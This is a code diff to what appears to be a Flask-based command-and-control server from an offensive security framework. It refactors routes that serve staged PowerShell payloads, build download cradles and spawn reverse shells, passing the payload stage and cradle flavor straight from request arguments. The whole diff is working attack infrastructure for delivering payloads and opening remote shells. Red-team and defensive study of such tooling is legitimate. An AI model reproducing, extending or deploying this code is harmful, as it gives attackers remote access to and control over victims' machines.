@@ -137,14 +137,7 @@ def hub():
 @app.route('/receiver')
 @requires_auth
 def receiver():
-    try:
-        cradle = build_cradle(request.args, flavor='reverse_shell'),
-    except BadRequestKeyError:
-        log.error("Unknown key, must be one of %s" % str(request.args))
-        cradle = 'error'
-
     context = {
-        "dl_str": cradle,
         "SSL": args.SSL_KEY is not None,
         "shells": shell_receiver.active_shells(),
         "AUTH": args.AUTH,
@@ -357,7 +350,7 @@ def payload_0():
         "key": KEY,
         "strings": encrypted_strings,
         "symbol_name": symbol_name,
-        "stage2": 'r' if 'r' in request.args else '1',
+        "stage2": request.args["f"],
         "exec_clipboard_entry": exec_clipboard_entry,
     }
     result = render_template(
@@ -368,9 +361,9 @@ def payload_0():
     return result
 
 
-@app.route('/1')
-def payload_1():
-    """Load 1st stage"""
+@app.route('/h')
+def payload_h():
+    """Load next stage of the Hub"""
     try:
         with open(os.path.join(XDG_DATA_HOME, "profile.ps1"), "r") as f:
             profile = f.read()
@@ -425,7 +418,7 @@ def payload_l():
 @app.route('/dlcradle')
 def dlcradle():
     try:
-        return build_cradle(request.args)
+        return build_cradle(request.args, flavor=request.args["flavor"])
     except BadRequestKeyError as e:
         log.error("Unknown key, must be one of %s" % str(request.args))
         return (str(e), 500)
@@ -514,7 +507,7 @@ def reload_modules():
 
 @app.route('/r', methods=["GET"])
 def reverse_shell():
-    """Spawn a reverse shell"""
+    """Load next stage of the Reverse Shell"""
     context = {
         "dl_cradle": build_cradle(
             request.args,
